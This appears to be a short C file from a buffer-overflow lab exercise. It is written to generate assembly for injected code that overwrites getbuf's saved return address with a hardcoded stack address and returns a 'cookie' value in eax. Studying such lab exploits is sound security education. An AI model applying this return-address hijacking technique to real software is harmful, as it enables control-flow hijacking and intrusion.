unsigned int foo( void ) //this is just a file to generate assembly code from c


/*
{
  unsigned *ptr = 0x0804d10; //declare a pointer
  *ptr = 0x605d0c20; //write the cookie into the pointer
}
*/


//need to set return address back to that of test: 08048dba
{
	unsigned *ptr = 0x55683544; //declare a pointer to location or return address for getbuf
	*ptr = 0x08048dce; //set that to what it was before: address of line just after getbuf call
	//unsigned *ptr_2 = 0x55683544;
	//*ptr_2 = 0x08048dce;
	return 0x605d0c20; //set $eax = cookie
}

unsigned int jump( void )
{
	void *addr = 0x08048dce;	
	goto *addr;
}

